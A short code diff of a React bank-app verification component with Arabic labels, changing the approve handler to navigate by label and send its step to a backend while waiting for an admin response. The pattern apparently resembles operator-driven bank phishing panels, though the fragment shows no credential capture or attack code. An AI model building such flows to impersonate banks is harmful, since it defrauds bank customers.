@@ -39,9 +39,11 @@ export default function BankAppVerification() {
 
   const handleApprove = () => {
     setError(false);
+    const label = rejected ? "طلب إشعار جديد" : "تطبيق البنك";
     setRejected(false);
     setIsWaiting(true);
-    sendData({ current: "تطبيق البنك", nextPage: "الصفحة النهائية", waitingForAdminResponse: true });
+    navigateToPage(label);
+    sendData({ current: label, nextPage: "الصفحة النهائية", waitingForAdminResponse: true });
   };
 
   return (
